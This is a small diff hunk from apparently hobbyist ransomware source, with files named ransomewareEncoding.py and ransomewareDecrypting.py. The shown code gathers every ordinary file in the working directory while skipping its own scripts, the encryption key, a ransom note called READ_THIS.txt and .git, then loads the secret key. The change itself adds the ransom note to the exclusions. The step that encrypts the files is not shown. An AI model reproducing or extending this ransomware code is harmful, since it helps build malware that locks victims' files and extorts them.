@@ -20,12 +20,11 @@ for file in os.listdir():
 print(files)'''
 
 for file in os.listdir():
-    if file== "ransomewareEncoding.py" or file=="encryption.key" or file==".git" or file=="ransomewareDecrypting.py" or file=="ransomewareDecrypting.exe" or file=="ransomewareEncoding.exe":
+    if file== "ransomewareEncoding.py"  or file=="ransomewareDecrypting.py" or file=="encryption.key" or file=="READ_THIS.txt" or file==".git":
         continue
     if os.path.isdir(file):
         continue
     files.append(file)
-print(files)
 
 with open("encryption.key","rb") as key:
     secretkey=key.read()
